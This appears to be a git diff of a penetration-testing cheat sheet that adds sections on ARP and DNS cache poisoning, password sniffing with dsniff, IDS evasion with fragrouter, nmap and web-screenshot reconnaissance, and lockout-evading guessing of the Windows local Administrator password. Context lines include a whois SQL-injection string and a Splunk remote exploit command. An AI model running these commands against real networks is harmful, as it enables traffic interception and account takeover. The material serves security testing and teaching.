@@ -61,6 +61,14 @@ auxiliary/gather/dns_reverse_lookup  # Perform a reverse DNS (PTR) scan of a net
 auxiliary/gather/dns_srv_enum        # Enumerates SRV (Server) records
 ```
 
+### ICMP - Host Discovery
+
+A pingsweep is where we will ping every possible IP address within a given range to determine which ones send you a reply and are therefore considered up or live.
+
+```bash
+ping 127.0.0.1 -c 1 -W 1 # Send only a single ping and force a timeout after one second
+```
+
 ### ICMP - OS Guessing (without Nmap)
 
 ```bash
@@ -80,19 +88,95 @@ The WHOIS protocol provdes client/server access to information about internet do
 whois -h IP -p PORT DOMAIN # Get all the information that a whois service has about a domain
 ```
 
-Note that WHOIS relies on databases to store. SQLi maybe possible with the following
+Note that WHOIS relies on databases to store information. SQLi maybe possible with the following
 
 ```bash
 whois -h IP -p PORT "a') or 1=1#"
 ```
 
-### Port Scan
+### Network Attacks
+
+#### ARP Cache Poisoning
+
+We can also use ARP cache poisoning for multiple purpose:
+
+- Impersonate the default gateway and act as a web proxy to intercept all the traffic intended to Internet.
+
+![ARP Spoofing](ARP_Spoofing.png)
+
+[arpspoof](https://linux.die.net/man/8/arpspoof) redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies. This is an extremely effective way of sniffing traffic on a switch.
 
 ```bash
-nmap -p- -oA nmap/allports -v IP # 1) Perform a scan on all ports with the verbose mode
+# Perform arp spoofing on INTERFACE on target 192.168.0.1 
+arpspoof -i INTERFACE -t 192.168.0.1 192.168.20.10
+```
+
+You could mix it with [dsniff](https://linux.die.net/man/8/dsniff) which is a password sniffer which handles FTP, Telnet, SMTP, HTTP, POP, poppass, NNTP, IMAP, SNMP, LDAP, Rlogin, RIP, OSPF, PPTP MS-CHAP, NFS, VRRP, YP/NIS, SOCKS, X11, CVS, IRC, AIM, ICQ, Napster, PostgreSQL, Meeting Maker, Citrix ICA, Symantec pcAnywhere, NAI Sniffer, Microsoft SMB, Oracle SQL*Net, Sybase and Microsoft SQL protocols.
+
+Command options:
+
+- **-c**: Perform half-duplex TCP stream reassembly (such as when using arpspoof to intercept client traffic bound for the local gateway)
+- **-m**: Enable automatic protocol detection.
+- **-i**: Specify the interface to listen on.
+
+```bash
+dsniff -c -m -i eth0
+```
+
+You could mix it with [fragrouter](https://linux.die.net/man/8/fragrouter) which is a network intrusion detection evasion toolkit.
+
+Command options:
+
+- **-i**: Specify the network interface
+- **-g**: Specify the next-hop (default gateway)
+
+```bash
+fragrouter -i eth0 -B1
+```
+
+#### DNS Cache Poisoning
+
+DNS cache poisoning is the act of entering false information into a DNS cache, so that DNS queries return an incorrect response and users are directed to the wrong websites.
+
+![DNS Cache Poisoning](DNS_CachePoisoning.jpg)
+
+Source: <https://www.imperva.com/learn/application-security/dns-spoofing/>
+
+[dnsspoof](https://github.com/DanMcInerney/dnsspoof) can be used to drop DNS responses before they hit the router then replaces them with the spoofed DNS response.
+
+```bash
+# Spoof google.com to point back to the attack's machine.
+dnsspoof -r 192.168.0.1 -v 192.168.0.5 -d google.com
+# Spoof all DNS lookup requests to point to IP_X
+dnsspoof -r 192.168.0.1 -v 192.168.0.5 -a -t IP_X
+```
+
+*Note that dnsspoof is 7 years old and may need to be run with Python 2*
+
+For more information about that attack patern refer to [CAPEC-142: DNS Cache Poisoning](https://capec.mitre.org/data/definitions/142.html)
+### Port Scan
+
+#### Range
+
+```bash
+nmap -Pn -n -p 22,80,443,3389 -iL RANGE -oX hosts_4.xml
+nmap -Pn -n --top-ports 20 -iL RANGE -oX hosts_20.xml
+```
+
+Then parse the output using [parsenmap](https://github.com/R3dy/parsenmap)
+
+```bash
+parsenmap services/full-sweep.xml
+parsenmap services/full-sweep.xml > services/all-ports.csv
+```
+
+#### Single Host
+
+```bash
+nmap -p- -r oA nmap/allports -v IP # 1) Perform a scan on all ports with the verbose mode
 cat nmap/allports.nmap | grep open | awk -F/ '{print $1}' ORS="," # 2) Get all opened ports separated by commas
-nmap -sC -sV -oA nmap/specificports -p PORTS -v IP # 3) Run a Script scan on open ports
-nmap -sY IP -v # Perform a SCTP scan
+nmap -sC -Pn -r -sV -oA nmap/specificports -p PORTS -v IP # 3) Run a Script scan on open ports
+nmap -sY -Pn -r IP -v # Perform a SCTP scan
 ```
 
 - **-p-**: Run on all ports (except port 0 within some version)
@@ -100,7 +184,13 @@ nmap -sY IP -v # Perform a SCTP scan
 - **-sC**: Script Scan
 - **-sV**: Probe open ports to determine service/version info
 - **-p**: Run only on those ports (eg: )
+- **-Pn**: Tells Nmap to skip the ping test and simply scan every target host provided.
+- **-r**: Nmap randomizes the port scan order by default to make detection slightly harder.
 - **-sY**: SCTP INIT/COOKIE-ECHO scans. SCTP sits alongside TCP and UDP. Intended to provide transport of telephony data over IP, the protocol duplicates many of the reliability features of Signaling System 7 (SS7), and underpins a larger protocol family known as SIGTRAN. SCTP is supported by operating systems including IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS, and VxWorks.
+
+By default, Nmap scans the **1000** most popular ports of each protocol it is asked to scan.
+You can specify the **-F** (fast) option to scan only the 100 most common ports in each protocol.
+You can specify the **--top-ports N** to specify an arbitrary number of ports to scan.
 
 If there are a lot of systems, you may need to use zenmap
 
@@ -128,6 +218,67 @@ If you see those following message, it means that for some packets, Nmap it is g
 
 By doing this, Nmap can differentiate between ports that are **blocked by firewalls** (no response regardless of sending interval) or **closed, but rate limited** (able to receive icmp destination unreachable response if the sending interval is sufficiently large).
 
+#### Hping
+
+> / / To Finish
+
+[hping](https://github.com/antirez/hping) is a free packet generator and analyzer for the TCP/IP protocol.
+It is one of the de facto tools for security auditing and testing of firewalls and networks, and was used to exploit the idle scan scanning technique (also invented by the hping author), and now implemented in the Nmap Security Scanner.
+
+There is a new version which is hping3
+
+<http://blog.tofte-it.dk/ethical-hacking-nmap-scruby-hping3/>
+
+#### Side Note: Packet Capture
+
+There are some scenarios were we need to stay under the radar as much as possible and a big nmap can be very noisy.
+
+One way is to perform traffic capture in order to see what's going on, on the network.
+
+This can be done with tools like [tcpdump](https://www.tcpdump.org/manpages/tcpdump.1.html)
+
+### HTTP & HTTPS
+
+#### EyeWitness
+
+[EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
+
+```bash
+./EyeWitness -f urls.txt --web
+
+nmap --open -p 80,443 IP_RANGE/24 -oX scan_web.xml
+./EyeWitness -x urls.xml --timeout 10
+```
+
+*Note that it is not installed by default on Kali Linux*
+
+#### httpscreenshot
+
+[httpscreenshot](https://github.com/breenmachine/httpscreenshot) is a tool for grabbing screenshots and HTML of large numbers of websites.
+
+Options are the following:
+
+- **-p**: Use phantomjs instead of Mozilla Firefox (In order to go faster)
+- **-i**: Takes a gnmap file as input.
+- **-a**: Tries to SSL detect on its own.
+- **-vH**: For each SSL enabled website, extract the hostnames from the CN and subject alt names field, and add them to the list of URL's to be screenshotted.
+- **-t x**: Timeout in seconds.
+- **-w x**: Number of threads to use.
+
+There is a masshttp.sh which will do the following
+
+1) Run masscan on port 80 & 443
+2) Create a directory called "httpscreenshots"
+3) Run httpscreenshot.py using -p -t 30 -w 50 -a -vH
+4) Run httpscreenshot.py using -p -t 10 -w 10 -a -vH
+5) Run screenshotClustering in order to have a nice HTML file with all finding
+
+```bash
+echo IP_RANGE >> networks.txt
+masshttp.sh 
+firefox clusters.html
+```
+
 ### Automated Scan
 
 #### Raccoon
@@ -143,7 +294,7 @@ It perform multiple checks:
 - ...
 
 ```bash
-raccoon -vulners-nmap-scan --no-sub-enum --no-url-fuzzing TARGET
+raccoon --vulners-nmap-scan --no-sub-enum --no-url-fuzzing TARGET
 ```
 
 I specify both **--no-sub-enum** and **--no-url-fuzzing** to not bruteforce subdomains and not fuzz URLs as it takes more times then to the scripts to run and it let a lot of noize.
@@ -238,6 +389,8 @@ snmpv3enum.rb -i IP -u /usr/share/metasploit-framework/data/wordlists/snmp_defau
 - **Devices**: grep ".1.3.6.1.2.1.1.1.0" *.snmp
 - **Usernames/passwords**: grep -i "login\|fail" *.snmp
 - **Emails Addresses**: grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" *.snmp
+
+For more information about that technique refer to [T1602.001 - Data from Configuration Repository: SNMP (MIB Dump)](https://attack.mitre.org/techniques/T1602/001/)
 
 ### RPC
 
@@ -594,7 +747,11 @@ By default it's *"0 invalid sign-in attempts"*
 
 The **Account lockout duration** policy setting determines the number of minutes that a locked-out account remains locked out before automatically becoming unlocked.
 
-It is advisable to set Account lockout duration to approximately 15 minutes.
+*Note that the local administrator account (UID 500) is typically safe to guess against because the default behavior for this account avoids being locked out due to multiple failed login attempts. This feature helps protect IT/system administrators from accidentally locking themselves out of a Windows machine.*
+
+```bash
+cme smb IP --local-auth -u Administrator -p rockyou.txt
+```
 
 ### LDAP
 
@@ -698,11 +855,13 @@ PySplunkWhisperer2_remote.py --host IP --port 8090 --lhost OUR_IP --lport OUR_PO
 
 ### MySQL
 
-If we have user, we can try to connect on the database 
+If we have user, we can try to connect on the database,
 
 ```bash
-mysql -h IP -u USER
+mysql -h IP -u USER -p -P 3306 DATABASE
 ```
+
+*Don't forget to specify the **-p** in order to say that you want to connect with a password*
 
 ### Finger Service
 
